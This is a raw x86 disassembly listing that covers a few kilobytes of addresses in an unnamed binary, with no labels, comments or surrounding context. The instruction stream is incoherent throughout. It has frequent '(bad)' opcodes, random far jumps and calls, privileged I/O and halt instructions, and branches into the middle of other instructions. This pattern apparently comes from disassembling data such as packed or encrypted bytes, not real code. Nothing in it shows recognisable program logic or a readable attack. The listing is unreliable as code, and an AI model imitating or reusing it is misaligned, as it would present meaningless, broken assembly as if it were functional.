  4082e9:	pop    ss
  4082ea:	aas    
  4082eb:	adc    eax,0xdd566d58
  4082f0:	div    BYTE PTR [ecx-0x7e]
  4082f3:	inc    DWORD PTR [ebx-0x44a0a37a]
  4082f9:	popf   
  4082fa:	push   ss
  4082fb:	pop    esi
  4082fc:	imul   edx,ebp,0xffffffdd
  4082ff:	and    ah,BYTE PTR [ebx-0x77aba341]
  408305:	add    esp,edx
  408307:	repz repnz jmp 0xfaf8:0x84d5c8e6
  408310:	dec    ebp
  408311:	sub    al,0xb6
  408313:	dec    esp
  408314:	sbb    al,0x48
  408316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408317:	test   BYTE PTR [esi+0x4589b98c],bl
  40831d:	sub    al,0x9b
  40831f:	xor    DWORD PTR [ebx-0x52],esi
  408322:	lods   al,BYTE PTR ds:[esi]
  408323:	mov    ds:0xad11d20b,eax
  408328:	scas   al,BYTE PTR es:[edi]
  408329:	aad    0xbe
  40832b:	cmp    bh,BYTE PTR [edi+ebp*1]
  40832e:	ins    DWORD PTR es:[edi],dx
  40832f:	and    edx,DWORD PTR [edi]
  408331:	popa   
  408332:	push   ss
  408333:	jmp    0x40832a
  408335:	xchg   BYTE PTR [ebp-0x67c1f95b],bl
  40833b:	xor    al,0x7b
  40833d:	ds inc edx
  40833f:	jb     0x408345
  408341:	mov    dl,0x65
  408343:	jmp    0xb9482e34
  408348:	repz mov al,ds:0xceecfb52
  40834e:	jecxz  0x408316
  408350:	icebp  
  408351:	iret   
  408352:	adc    al,0x41
  408354:	xor    DWORD PTR [ebp+0x66da5c59],edi
  40835a:	jne    0x40831d
  40835c:	sub    DWORD PTR [ecx+0x4a3bd0fb],edx
  408362:	dec    ebx
  408363:	aaa    
  408364:	scas   al,BYTE PTR es:[edi]
  408365:	out    dx,eax
  408366:	cmp    DWORD PTR ds:0xd95e875,ecx
  40836c:	jae    0x40838f
  40836e:	dec    ecx
  40836f:	adc    DWORD PTR [ebp-0x57990a7a],0x930f7e65
  408379:	call   0x18a60b9e
  40837e:	cdq    
  40837f:	mov    esi,esi
  408381:	sbb    dh,BYTE PTR [ecx+0x4d]
  408384:	adc    DWORD PTR [edi-0x776e57bb],eax
  40838a:	mov    ds:0x84c18897,eax
  40838f:	std    
  408390:	mov    esp,0xff883fb0
  408395:	fdiv   DWORD PTR [edx]
  408397:	jle    0x4083df
  408399:	cdq    
  40839a:	(bad)  
  40839b:	leave  
  40839c:	repnz cmp eax,0xe3b4a0d2
  4083a2:	(bad)  
  4083a3:	sbb    bh,BYTE PTR [ebp-0x47]
  4083a6:	test   ch,bl
  4083a8:	xor    BYTE PTR [esi-0x3c9b9c71],0x15
  4083af:	fstp   st(5)
  4083b1:	sbb    eax,0xb7b7cb70
  4083b6:	retf   
  4083b7:	xchg   edx,eax
  4083b8:	imul   eax,edx,0xffffff93
  4083bb:	mov    bl,0x9
  4083bd:	mov    dh,BYTE PTR [eax]
  4083bf:	sub    edi,0x34a35194
  4083c5:	sar    DWORD PTR [eax+0x63],0xb3
  4083c9:	jb     0x40840c
  4083cb:	hlt    
  4083cc:	lea    esp,[esi]
  4083ce:	scas   eax,DWORD PTR es:[edi]
  4083cf:	xor    al,0x92
  4083d1:	jo     0x408390
  4083d3:	mov    eax,ds:0x5a247373
  4083d8:	ret    0x4f9
  4083db:	ins    DWORD PTR es:[edi],dx
  4083dc:	mov    esp,0xeac09ca8
  4083e1:	jb     0x4083de
  4083e3:	push   0x17b7a14a
  4083e8:	push   0x58eadec
  4083ed:	add    BYTE PTR ds:0xcc173ce7,ah
  4083f3:	int3   
  4083f4:	enter  0x675a,0x78
  4083f8:	inc    ebp
  4083f9:	add    BYTE PTR [edx],ch
  4083fb:	std    
  4083fc:	imul   edx,DWORD PTR [ecx-0x4de578db],0x8128c5b0
  408406:	or     al,0x41
  408408:	mov    esi,esp
  40840a:	mov    al,0xe8
  40840c:	icebp  
  40840d:	in     eax,dx
  40840e:	sbb    dl,BYTE PTR [esi+0x4c58ba73]
  408414:	test   ecx,0x89fd7b37
  40841a:	and    esp,DWORD PTR ds:0xa215a68b
  408420:	adc    eax,0x31762588
  408425:	jnp    0x4084a5
  408427:	aas    
  408428:	or     edi,edi
  40842a:	adc    DWORD PTR [ebp-0x8],ebx
  40842d:	enter  0x99d6,0xc
  408431:	sub    eax,0x30a59ad6
  408436:	ror    dh,1
  408438:	pop    esi
  408439:	sbb    esi,DWORD PTR [ecx-0x28]
  40843c:	push   eax
  40843d:	clc    
  40843e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40843f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408440:	xor    ecx,0x50527c13
  408446:	ins    BYTE PTR es:[edi],dx
  408447:	add    BYTE PTR [ecx-0x2e92c8ce],ch
  40844d:	aaa    
  40844e:	adc    DWORD PTR [ecx-0x9],eax
  408451:	mov    eax,ds:0x4813b6f5
  408456:	mov    al,ds:0x70744923
  40845b:	inc    eax
  40845c:	inc    ebx
  40845d:	jmp    0x8f14:0xb23531e2
  408464:	mov    WORD PTR [ecx],?
  408466:	test   eax,0xf277a64a
  40846b:	pop    ecx
  40846c:	pop    ebx
  40846d:	xchg   DWORD PTR [edx+eiz*2-0x6a30f8b6],esp
  408474:	lds    ebp,FWORD PTR [eax+edi*8]
  408477:	or     ecx,edi
  408479:	jg     0x408469
  40847b:	adc    al,0x61
  40847d:	test   BYTE PTR [ebx-0x14],bl
  408480:	mov    ebp,0xb9cdf120
  408485:	cld    
  408486:	stos   DWORD PTR es:[edi],eax
  408487:	mov    ah,0xda
  408489:	cmp    cl,BYTE PTR [ebx-0x93437b0]
  40848f:	rcr    BYTE PTR [eax-0x9ec9972],1
  408495:	in     eax,0x3a
  408497:	mov    ch,0xa5
  408499:	arpl   WORD PTR [esi-0x40],ax
  40849c:	lods   al,BYTE PTR ds:[esi]
  40849d:	xchg   DWORD PTR [ecx+0x66],ecx
  4084a0:	jno    0x408457
  4084a2:	dec    ecx
  4084a3:	add    DWORD PTR [edx-0x707e40af],esp
  4084a9:	pop    esp
  4084aa:	dec    esi
  4084ab:	inc    edx
  4084ac:	sbb    ebp,DWORD PTR [edi]
  4084ae:	mov    eax,0xe045888
  4084b3:	sub    al,0x3b
  4084b5:	cmp    esi,edx
  4084b7:	sbb    ecx,ebp
  4084b9:	fdivr  st,st(3)
  4084bb:	add    eax,DWORD PTR [esi+0x72]
  4084be:	scas   al,BYTE PTR es:[edi]
  4084bf:	and    edx,DWORD PTR [edi+0x3fda6cc8]
  4084c5:	inc    esi
  4084c6:	cli    
  4084c7:	iret   
  4084c8:	sbb    cl,BYTE PTR [ebx-0x3d]
  4084cb:	or     ebx,DWORD PTR ds:0x1c7b6b4f
  4084d1:	xlat   BYTE PTR ds:[ebx]
  4084d2:	(bad)  
  4084d3:	sub    edx,eax
  4084d5:	mov    ds:0x31aa2f65,eax
  4084da:	dec    edx
  4084db:	sub    al,0xab
  4084dd:	cld    
  4084de:	mov    ebx,0x44846ead
  4084e3:	call   0x99e:0x4592358a
  4084ea:	sbb    DWORD PTR [edx],edi
  4084ec:	pop    esp
  4084ed:	mov    eax,ds:0x21d8548c
  4084f2:	add    eax,0x82b41517
  4084f7:	repnz dec ebp
  4084f9:	imul   eax,ebx,0xffffffc3
  4084fc:	add    BYTE PTR [eax-0x4618a1b7],al
  408502:	jno    0x40850e
  408504:	and    edi,DWORD PTR [ebx-0xd]
  408507:	and    eax,0xf88280a
  40850c:	pop    edi
  40850d:	inc    ebp
  40850e:	stos   DWORD PTR es:[edi],eax
  40850f:	and    esi,DWORD PTR [ebx]
  408511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408512:	shr    DWORD PTR [edi+0x1d],0x9d
  408516:	inc    ecx
  408517:	das    
  408518:	(bad)  
  408519:	jmp    DWORD PTR [ebx-0x7b]
  40851c:	cmp    esp,DWORD PTR [eax]
  40851e:	(bad)  
  40851f:	adc    BYTE PTR [eax-0x46],bl
  408522:	shr    DWORD PTR [edx+0x391af017],cl
  408528:	sbb    al,0x7a
  40852a:	adc    al,0x72
  40852c:	aaa    
  40852d:	nop
  40852e:	mov    es,ebp
  408530:	xchg   ebp,eax
  408531:	push   cs
  408532:	loopne 0x4084e9
  408534:	mov    dl,0xcc
  408536:	or     al,0xf2
  408538:	repz leave 
  40853a:	aam    0x49
  40853c:	push   es
  40853d:	int3   
  40853e:	mov    bh,0xda
  408540:	in     eax,dx
  408541:	sub    ch,BYTE PTR [edi+0x12]
  408544:	mov    esp,0x63386495
  408549:	pop    esp
  40854a:	xchg   BYTE PTR [esi-0x76],ah
  40854d:	ss das 
  40854f:	dec    edi
  408550:	adc    eax,0xf571f77b
  408555:	mov    esi,0x63b6782b
  40855a:	(bad)  
  40855b:	and    eax,0xc3dbc95b
  408560:	jmp    0x2e9e:0xbd2f8655
  408567:	aad    0x56
  408569:	frstor [edi+0x5f]
  40856c:	mov    ch,0x1c
  40856e:	push   ecx
  40856f:	daa    
  408570:	cmc    
  408571:	dec    ecx
  408572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408573:	jp     0x4085f4
  408575:	xchg   edx,eax
  408576:	into   
  408577:	div    eax
  408579:	fidivr DWORD PTR [edx]
  40857b:	mov    eax,ds:0xe6043920
  408580:	sub    ch,0xd2
  408583:	scas   al,BYTE PTR es:[edi]
  408584:	adc    al,0xaf
  408586:	sti    
  408587:	push   0x23e1e82
  40858c:	scas   eax,DWORD PTR es:[edi]
  40858d:	sbb    DWORD PTR [ecx+edi*8+0x760db96d],edx
  408594:	imul   ecx,DWORD PTR ds:0xb14a3a64,0xa2c39502
  40859e:	stc    
  40859f:	fbstp  TBYTE PTR [edx]
  4085a1:	test   eax,0x8f9dda90
  4085a6:	xlat   BYTE PTR ds:[ebx]
  4085a7:	cs jg  0x4085d3
  4085aa:	mov    WORD PTR [edi],ds
  4085ac:	xor    ah,BYTE PTR [ebx+ebx*1+0x4e]
  4085b0:	push   cs
  4085b1:	dec    ecx
  4085b2:	icebp  
  4085b3:	and    DWORD PTR [ebp+eiz*4+0x6ff63493],esp
  4085ba:	add    eax,0x91045c20
  4085bf:	xor    DWORD PTR [edi-0xa],ecx
  4085c2:	scas   al,BYTE PTR es:[edi]
  4085c3:	dec    ebp
  4085c4:	aam    0x4f
  4085c6:	test   BYTE PTR [ebx+0x8],cl
  4085c9:	lea    esi,[edx+0x17]
  4085cc:	repnz sti 
  4085ce:	(bad)  
  4085cf:	shld   ecx,ebp,cl
  4085d2:	inc    ebx
  4085d3:	in     al,0x10
  4085d5:	retf   
  4085d6:	out    dx,eax
  4085d7:	ss sub edi,esi
  4085da:	dec    edx
  4085db:	sub    al,0xd2
  4085dd:	xchg   edx,esi
  4085df:	out    0xac,al
  4085e1:	sub    ebx,DWORD PTR [eax+0x625776fc]
  4085e7:	dec    ebp
  4085e8:	and    ah,BYTE PTR [ebx]
  4085ea:	neg    DWORD PTR [edx+0x2ef74b9]
  4085f0:	(bad)  
  4085f1:	adc    ah,ch
  4085f3:	call   0x9cb8:0xa08f46f9
  4085fa:	mov    cl,0x4f
  4085fc:	daa    
  4085fd:	jmp    0xd514c46d
  408602:	pop    ds
  408603:	icebp  
  408604:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408605:	pop    ds
  408606:	mov    bh,0xf5
  408608:	aad    0x3d
  40860a:	daa    
  40860b:	out    0x99,eax
  40860d:	push   esp
  40860e:	xor    DWORD PTR [eax+0x5c4bde27],ebx
  408614:	xor    al,0xd7
  408616:	adc    al,0x6
  408618:	hlt    
  408619:	mov    esi,0xaa000003
  40861e:	pop    ecx
  40861f:	std    
  408620:	mov    ecx,0x1a08eb77
  408625:	push   ss
  408626:	mov    ebx,DWORD PTR [ecx]
  408628:	xor    al,0xc
  40862a:	jg     0x4085e0
  40862c:	in     eax,0x62
  40862e:	or     eax,0xe50916c8
  408633:	bound  ebx,QWORD PTR [ecx]
  408635:	xor    ch,0xa
  408638:	adc    esi,DWORD PTR [esp+eax*4+0x3c]
  40863c:	dec    ecx
  40863d:	pop    ss
  40863e:	xchg   ebp,eax
  40863f:	aad    0xca
  408641:	pop    esp
  408642:	aas    
  408643:	push   eax
  408644:	fisubr DWORD PTR [edi]
  408646:	mov    ecx,0x7e7ec6eb
  40864b:	xor    al,0xbc
  40864d:	or     DWORD PTR [ebp+0x41],ebp
  408650:	mov    ecx,0xb2fb2445
  408655:	mov    al,0x4a
  408657:	jp     0x408609
  408659:	ror    DWORD PTR [esi+0x77],cl
  40865c:	into   
  40865d:	dec    esi
  40865e:	inc    DWORD PTR [edi-0x497282e4]
  408664:	in     al,0x11
  408666:	addr16 sbb edx,edx
  408669:	jo     0x40864b
  40866b:	outs   dx,DWORD PTR ds:[esi]
  40866c:	ss out dx,al
  40866e:	gs cs hlt 
  408671:	stc    
  408672:	std    
  408673:	dec    edi
  408674:	daa    
  408675:	add    esp,esp
  408677:	sub    BYTE PTR [ebx+0x33],0x10
  40867b:	fwait
  40867c:	cmp    DWORD PTR [ebx+0x3090066e],ebp
  408682:	ror    DWORD PTR [esi-0xa],1
  408685:	cmp    bl,bh
  408687:	out    0xf9,al
  408689:	scas   eax,DWORD PTR es:[edi]
  40868a:	mov    ds:0xece477ce,eax
  40868f:	outs   dx,BYTE PTR ds:[esi]
  408690:	xor    BYTE PTR [ebp+0xba12cb9],bl
  408696:	fmul   st(7),st
  408698:	jns    0x408706
  40869a:	fstp   st(3)
  40869c:	pop    ebp
  40869d:	mov    eax,0xbe9b8bf7
  4086a2:	or     BYTE PTR [edi-0x7c],bl
  4086a5:	jne    0x408643
  4086a7:	lea    edx,[eax+eiz*4-0xe4b030c]
  4086ae:	sbb    eax,0x9c388c08
  4086b3:	mov    ds:0xf5c6f5d8,al
  4086b8:	scas   eax,DWORD PTR es:[edi]
  4086b9:	push   esi
  4086ba:	outs   dx,DWORD PTR ds:[esi]
  4086bb:	jno    0x4086c1
  4086bd:	loopne 0x4086e9
  4086bf:	inc    ebp
  4086c0:	pusha  
  4086c1:	pop    es
  4086c2:	sub    al,0xec
  4086c4:	(bad)  
  4086c5:	ss cmc 
  4086c7:	ins    BYTE PTR es:[edi],dx
  4086c8:	push   esp
  4086c9:	dec    sp
  4086cb:	mov    edx,0xebb1c55b
  4086d0:	dec    esi
  4086d1:	dec    esi
  4086d2:	mov    bh,0x34
  4086d4:	mov    cl,0x6e
  4086d6:	xor    eax,0x509e3f43
  4086db:	sub    eax,0x2826ce72
  4086e0:	dec    esi
  4086e1:	(bad)  
  4086e3:	cli    
  4086e4:	aad    0x66
  4086e6:	leave  
  4086e7:	(bad)  
  4086e8:	jno    0x40873c
  4086ea:	fdivr  st(1),st
  4086ec:	inc    ebp
  4086ed:	sub    DWORD PTR [ebx],edx
  4086ef:	xor    eax,0x72fcba52
  4086f4:	or     DWORD PTR [eax+0x5c041d7],edi
  4086fa:	test   BYTE PTR [esi-0x1a],0x26
  4086fe:	jg     0x40869d
  408700:	add    ah,BYTE PTR [esp+ecx*2]
  408703:	cmp    edi,ecx
  408705:	jge    0x408765
  408707:	es jmp 0x4086b5
  40870a:	lods   al,BYTE PTR ss:[esi]
  40870c:	pusha  
  40870d:	sbb    ebp,0x88232554
  408713:	push   esp
  408714:	ret    0xdf43
  408717:	out    0xbc,al
  408719:	xor    eax,0x43844895
  40871e:	sub    BYTE PTR fs:[edx],dh
  408721:	nop
  408722:	inc    esi
  408723:	rcr    DWORD PTR [ecx+0x292bee58],1
  408729:	test   al,0x3b
  40872b:	call   0x285b:0x72552fc0
  408732:	add    BYTE PTR [edi-0x7b],ah
  408735:	test   ah,0x7c
  408738:	inc    edx
  408739:	mov    cs,WORD PTR [eax]
  40873b:	adc    eax,0xd1f41d6d
  408740:	(bad)  
  408741:	test   eax,0x4da66481
  408746:	nop
  408747:	call   0x8e5b252d
  40874c:	jnp    0x4086d8
  40874e:	add    ecx,edi
  408750:	push   DWORD PTR [ebp+eax*1+0x9]
  408754:	adc    eax,0xffffffba
  408757:	mov    ch,0xd1
  408759:	push   ds
  40875a:	out    0x5e,al
  40875c:	js     0x4087ac
  40875e:	push   esp
  40875f:	pop    esi
  408760:	retf   0x21f9
  408763:	lds    edi,FWORD PTR [edx]
  408765:	pushf  
  408766:	jnp    0x408752
  408768:	cmp    eax,0x15556b7f
  40876d:	mov    cl,0xd3
  40876f:	ret    0xa967
  408772:	mov    esi,0x44b74577
  408777:	inc    esp
  408778:	jle    0x4087af
  40877a:	out    0x56,eax
  40877c:	pop    ecx
  40877d:	idiv   BYTE PTR [eax-0x223a904]
  408783:	loope  0x4087f8
  408785:	mov    al,ds:0xc05579ef
  40878a:	xchg   edi,eax
  40878b:	dec    esp
  40878c:	and    esp,ecx
  40878e:	mov    edi,0xb09b4da4
  408793:	inc    ebp
  408794:	aas    
  408795:	adc    BYTE PTR [eax],cl
  408797:	push   ss
  408798:	dec    edi
  408799:	push   esp
  40879a:	icebp  
  40879b:	pusha  
  40879c:	cmp    ch,BYTE PTR [ebp+0x2f]
  40879f:	ins    DWORD PTR es:[edi],dx
  4087a0:	addr16 mov eax,ds:0x17a9
  4087a4:	xor    BYTE PTR [edi-0x60],cl
  4087a7:	sahf   
  4087a8:	jo     0x40878d
  4087aa:	nop
  4087ab:	add    BYTE PTR [edx],dl
  4087ad:	mul    BYTE PTR [edx+0x42]
  4087b0:	add    eax,0x531d7323
  4087b5:	mov    DWORD PTR [edi],ebx
  4087b7:	jno    0x4087b2
  4087b9:	or     dh,BYTE PTR [ebp-0x3770daf9]
  4087bf:	loope  0x4087d3
  4087c1:	clc    
  4087c2:	or     DWORD PTR [ecx-0x3ce47c64],ebp
  4087c8:	push   0x4893e6e6
  4087cd:	jne    0x40881a
  4087cf:	nop
  4087d0:	dec    ebp
  4087d1:	sbb    edx,DWORD PTR [edi]
  4087d3:	mov    esi,0x334b46a0
  4087d8:	ins    BYTE PTR es:[edi],dx
  4087d9:	push   eax
  4087da:	fiadd  DWORD PTR [ebp-0x7aaa06b8]
  4087e0:	cmp    edx,DWORD PTR [eax]
  4087e2:	cld    
  4087e3:	iret   
  4087e4:	sub    eax,0x2465179e
  4087e9:	(bad)  
  4087ea:	aam    0xee
  4087ec:	mov    eax,0xa3e74301
  4087f1:	clc    
  4087f2:	jge    0x40878a
  4087f4:	mov    dl,0xd2
  4087f6:	mov    dl,0x39
  4087f8:	cwde   
  4087f9:	mov    ecx,0x8237a956
  4087fe:	push   0x2aa0601c
  408803:	add    eax,0xac14db02
  408808:	int3   
  408809:	(bad)  
  40880a:	fstp   QWORD PTR [ebx+0x38]
  40880d:	in     eax,dx
  40880e:	out    0x34,al
  408810:	mov    DWORD PTR [eax-0x25],ebx
  408813:	jns    0x408823
  408815:	sar    DWORD PTR [ebx+0x66611aaa],cl
  40881b:	fs jns 0x4087bb
  40881e:	clc    
  40881f:	cmp    al,0xf6
  408821:	jno    0x4087c6
  408823:	out    0x76,al
  408825:	out    0xce,eax
  408827:	dec    esp
  408828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408829:	es in  eax,dx
  40882b:	lods   eax,DWORD PTR ds:[esi]
  40882c:	imul   ecx,ebx,0xe159fe29
  408832:	mov    eax,0x26c8ff81
  408837:	daa    
  408838:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408839:	pusha  
  40883a:	add    ecx,edi
  40883c:	popa   
  40883d:	(bad)  
  40883e:	xor    bh,BYTE PTR [ebp+edi*1+0x2b]
  408842:	mov    ah,0x76
  408844:	fcomp  DWORD PTR [ebx+0x6b90dd72]
  40884a:	push   0xffffffaf
  40884c:	or     cl,0xde
  40884f:	or     DWORD PTR [esi+0x7443b1c2],esi
  408855:	nop
  408856:	and    DWORD PTR [eax+0x375b1716],esp
  40885c:	mov    eax,ds:0xfb627642
  408861:	clc    
  408862:	out    dx,al
  408863:	xchg   ebp,eax
  408864:	and    ebp,DWORD PTR [eax]
  408866:	outs   dx,DWORD PTR ds:[esi]
  408867:	aas    
  408868:	(bad)  
  40886a:	popa   
  40886b:	or     ebp,DWORD PTR ds:0xac002309
  408871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408872:	enter  0xdf18,0xfb
  408876:	add    DWORD PTR [edx-0x1d],0xce792c68
  40887d:	jb     0x4088f0
  40887f:	sbb    al,BYTE PTR [ebx+ebp*1+0x335765b]
  408886:	adc    DWORD PTR [edi],esi
  408888:	out    0x19,al
  40888a:	cdq    
  40888b:	pop    es
  40888c:	cmp    eax,0x910e9e55
  408891:	scas   al,BYTE PTR es:[edi]
  408892:	rol    DWORD PTR [eax-0x48ce9e57],cl
  408898:	mov    ebp,0x76ecf30
  40889d:	dec    edx
  40889e:	adc    al,0x4a
  4088a0:	pusha  
  4088a1:	mov    edi,0x6b1795ac
  4088a6:	mov    dh,0x9e
  4088a8:	xor    BYTE PTR [ecx+0x62803465],ah
  4088ae:	retf   0x52ae
  4088b1:	mov    DWORD PTR [edx],esp
  4088b3:	dec    edi
  4088b4:	jg     0x408898
  4088b6:	cmp    DWORD PTR [ebp-0x65],edx
  4088b9:	aaa    
  4088ba:	cmp    edx,DWORD PTR [esi]
  4088bc:	mov    ebx,0x935f331a
  4088c1:	inc    ebp
  4088c2:	or     cl,BYTE PTR [ebx+0x1]
  4088c5:	stc    
  4088c6:	xchg   esi,eax
  4088c7:	fimul  WORD PTR [edi]
  4088c9:	ss jne 0x408853
  4088cc:	mov    ds:0xf9bafbf1,al
  4088d1:	and    DWORD PTR [ecx],esp
  4088d3:	sbb    al,0x6
  4088d5:	mov    dh,BYTE PTR [ecx+eiz*8-0x34fa5bdc]
  4088dc:	lds    edi,FWORD PTR ds:0x443bd664
  4088e2:	rol    ebp,0x63
  4088e5:	inc    edi
  4088e6:	xlat   BYTE PTR ds:[ebx]
  4088e7:	push   ebp
  4088e8:	aaa    
  4088e9:	arpl   di,ax
  4088eb:	in     al,dx
  4088ec:	inc    edx
  4088ed:	call   0xbd5f:0x72c1e525
  4088f4:	cs retf 
  4088f6:	cwde   
  4088f7:	sub    dl,BYTE PTR [edx]
  4088f9:	mov    BYTE PTR es:[ebp-0x2f7f737d],ch
  408900:	xchg   esp,eax
  408901:	es cmc 
  408903:	cmp    al,0xb6
  408905:	xor    al,0xe0
  408907:	jecxz  0x4088a0
  408909:	jno    0x40890f
  40890b:	jns    0x408961
  40890d:	xor    eax,0x724a6223
  408912:	pop    es
  408913:	push   esi
  408914:	mov    ebx,0xc7d3e837
  408919:	ins    BYTE PTR es:[edi],dx
  40891a:	mov    ?,eax
  40891c:	add    al,0xf6
  40891e:	dec    sp
  408920:	adc    al,0xc8
  408922:	stos   BYTE PTR es:[edi],al
  408923:	fisub  DWORD PTR [eax+ebx*8-0x6c9e6a63]
  40892a:	or     DWORD PTR [ecx],ebp
  40892c:	call   0x22e1de0d
  408931:	aas    
  408932:	ss push edi
  408934:	xchg   BYTE PTR [ecx-0xb254247],dl
  40893a:	xchg   ecx,eax
  40893b:	pushf  
  40893c:	sub    eax,0x45d1b512
  408941:	iret   
  408942:	mov    DWORD PTR [eax],esi
  408944:	pusha  
  408945:	test   BYTE PTR [ebx],bl
  408947:	ds inc edx
  408949:	xor    al,0x62
  40894b:	call   0xf976:0xa890add2
  408952:	or     BYTE PTR [ebp-0x73],0x71
  408956:	fst    DWORD PTR [edi+0x65b46378]
  40895c:	mov    BYTE PTR [esi-0x4ff67c5b],ah
  408962:	push   ecx
  408963:	and    eax,0xbe56ee19
  408968:	int3   
  408969:	and    eax,0x19990e37
  40896e:	imul   edi,DWORD PTR [ebx+0x11],0x2db7884b
  408975:	xor    DWORD PTR [eax-0x7e1bacaf],ebx
  40897b:	mov    DWORD PTR [edi+edi*1+0x37d7e80b],edi
  408982:	fiadd  WORD PTR [edi-0x5bd1b61d]
  408988:	pop    esi
  408989:	and    al,0x4d
  40898b:	(bad)  
  40898c:	arpl   bx,bx
  40898e:	cli    
  40898f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408990:	push   esp
  408991:	mov    eax,ds:0xf17527c3
  408996:	pop    ebp
  408997:	iret   
  408998:	les    eax,FWORD PTR [eax]
  40899a:	ficomp DWORD PTR [edi+0x43b4708f]
  4089a0:	push   ss
  4089a1:	ret    0x9eb2
  4089a4:	fsubrp st(5),st
  4089a6:	pop    es
  4089a7:	push   edx
  4089a8:	rcl    DWORD PTR [esp+ecx*4],cl
  4089ab:	in     eax,dx
  4089ac:	sub    al,0xef
  4089ae:	sbb    al,0xd3
  4089b0:	sub    esi,DWORD PTR [eax+0x76]
  4089b3:	daa    
  4089b4:	dec    edx
  4089b5:	push   esp
  4089b6:	aaa    
  4089b7:	adc    eax,DWORD PTR [edx-0x44f4d1ed]
  4089bd:	sub    esp,DWORD PTR [edi-0x22]
  4089c0:	jl     0x4089c2
  4089c2:	aad    0x78
  4089c4:	lock mov ah,0x77
  4089c7:	loop   0x40899d
  4089c9:	xchg   ebp,eax
  4089ca:	iret   
  4089cb:	xchg   dh,dh
  4089cd:	gs jle 0x408a29
  4089d0:	hlt    
  4089d1:	dec    ebp
  4089d2:	jge    0x4089c0
  4089d4:	jnp    0x408a53
  4089d6:	das    
  4089d7:	inc    esi
  4089d8:	aas    
  4089d9:	ret    0x8cf4
  4089dc:	mov    ebp,0xa535ad69
  4089e1:	in     al,dx
  4089e2:	jo     0x4089ff
  4089e4:	sub    al,0x61
  4089e6:	cmp    eax,0x435e81fc
  4089eb:	cld    
  4089ec:	mov    esp,DWORD PTR [edx+0x1d]
  4089ef:	pop    esi
  4089f0:	mov    cl,0x3b
  4089f2:	xchg   DWORD PTR [ecx+0x1272cd4f],esp
  4089f8:	mov    bl,dl
  4089fa:	(bad)
  4089fd:	jmp    0x120c:0x8162cddd
  408a04:	xor    BYTE PTR [eax+0x75],0x46
  408a08:	xor    al,0x1b
  408a0b:	xchg   ebx,eax
  408a0c:	push   edx
  408a0d:	xlat   BYTE PTR ds:[ebx]
  408a0e:	lods   eax,DWORD PTR ds:[esi]
  408a0f:	dec    bh
  408a11:	mov    al,ds:0x40a60ec6
  408a16:	pop    ss
  408a17:	lahf   
  408a18:	mov    dh,0xba
  408a1a:	lock leave 
  408a1c:	sub    ebx,eax
  408a1e:	addr16 push edx
  408a20:	aad    0xcd
  408a22:	dec    ebx
  408a23:	leave  
  408a24:	adc    DWORD PTR ds:[esi+0x14],ecx
  408a28:	mov    BYTE PTR [ebp+edx*8+0x7c],bl
  408a2c:	adc    dl,BYTE PTR [edi-0x10]
  408a2f:	dec    edx
  408a30:	jge    0x408aac
  408a32:	pop    edx
  408a33:	into   
  408a34:	mov    ds:0xada98068,eax
  408a39:	jne    0x408a35
  408a3b:	sar    DWORD PTR [ecx+ecx*8-0x67cac6af],1
  408a42:	fisubr DWORD PTR [ebp+0x5561aa3]
  408a48:	cs loop 0x408a1d
  408a4b:	out    dx,al
  408a4c:	cs shl esi,cl
  408a4f:	jno    0x408aa9
  408a51:	aad    0x25
  408a53:	sahf   
  408a54:	sti    
  408a55:	mov    ebp,0xd32b2a1a
  408a5a:	or     DWORD PTR [esi-0x2e],esp
  408a5d:	es pop es
  408a5f:	fisubr WORD PTR [eax-0x2f]
  408a62:	(bad)  
  408a63:	xor    eax,0x3374b79d
  408a68:	sar    BYTE PTR [ecx],1
  408a6a:	dec    edx
  408a6b:	add    bh,al
  408a6d:	repz iret 
  408a6f:	mov    esp,0xe5dc755b
  408a74:	mov    dl,0xec
  408a76:	cdq    
  408a77:	data16 xor dh,BYTE PTR [eax-0x689402cc]
  408a7e:	add    ebp,0x5d
  408a81:	push   0xacd46bac
  408a86:	fbld   TBYTE PTR [ecx]
  408a88:	sub    al,0x5e
  408a8a:	mov    ch,0x75
  408a8c:	aas    
  408a8d:	push   ebx
  408a8e:	dec    ecx
  408a8f:	mov    DWORD PTR [eax+0x7b13b3a7],eax
  408a95:	retf   0x461b
  408a98:	xor    ebp,ebp
  408a9a:	sbb    eax,0x4f1dc0fb
  408a9f:	push   ds
  408aa0:	add    al,0x8
  408aa2:	jne    0x408ac0
  408aa4:	pop    edi
  408aa5:	shl    DWORD PTR [ecx-0x48],cl
  408aa8:	fs pop eax
  408aaa:	stos   BYTE PTR es:[edi],al
  408aab:	add    BYTE PTR [ecx],ah
  408aad:	push   edx
  408aae:	ficomp WORD PTR [ecx-0x1c0e5621]
  408ab4:	mov    al,ds:0x694babaa
  408ab9:	popa   
  408aba:	mov    eax,ds:0x2a6f67e1
  408abf:	sub    bl,BYTE PTR [ebx-0x5e]
  408ac2:	add    eax,0x5c9c3657
  408ac7:	(bad)  
  408ac8:	ins    DWORD PTR es:[edi],dx
  408ac9:	arpl   WORD PTR [ebx],dx
  408acb:	addr16 dec ebp
  408acd:	jle    0x408ad4
  408acf:	or     BYTE PTR [esi],dh
  408ad1:	test   al,0x98
  408ad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ad4:	mov    ecx,0x22cde4ae
  408ad9:	mov    ah,dl
  408adb:	add    eax,0x9f52a352
  408ae0:	(bad)  [ecx-0x196bbee7]
  408ae6:	jg     0x408ab5
  408ae8:	rol    BYTE PTR [ecx],0x16
  408aeb:	mov    edx,0x43b6531a
  408af0:	call   0xab41:0x5655a2d2
  408af7:	jne    0x408a9f
  408af9:	jmpw   0xdfb
  408afd:	nop
  408afe:	test   DWORD PTR [ebp+0x35429008],ecx
  408b04:	cmp    eax,0xd0070df
  408b09:	int3   
  408b0a:	cs or  sp,0x8af7
  408b10:	mov    edi,0xcb6414c5
  408b15:	loopne 0x408ab2
  408b17:	shl    BYTE PTR [ecx+0x26],0x12
  408b1b:	(bad)  
